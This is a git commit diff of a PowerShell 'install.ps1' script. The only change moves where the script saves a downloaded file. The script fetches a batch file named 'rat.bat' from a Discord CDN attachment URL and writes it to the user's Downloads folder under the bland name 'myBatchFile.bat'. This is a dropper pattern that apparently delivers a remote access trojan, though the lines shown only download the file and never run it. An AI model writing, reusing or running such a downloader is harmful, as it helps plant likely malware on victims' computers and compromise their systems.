0b19ca1bc5c101ab20654ebd9c9b7cf504045c9c
Kaught <89326272+Kaughts@users.noreply.github.com>
2024-05-18 18:46:24 -0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -2,7 +2,7 @@
 $batchFileUrl = "https://cdn.discordapp.com/attachments/1223133700846391296/1241562344996343808/rat.bat?ex=664aa68a&is=6649550a&hm=7b6101fd77c5665be9372731fd20939fbcf83f5a13de3dfb08cc3acda60a46d0&"
 
 # Define the local path where the batch file will be saved
-$localPath = "C:\Users\bat.bat"
+$localPath = "$env:USERPROFILE\Downloads\myBatchFile.bat"
 
 # Download the batch file
 Invoke-WebRequest -Uri $batchFileUrl -OutFile $localPath
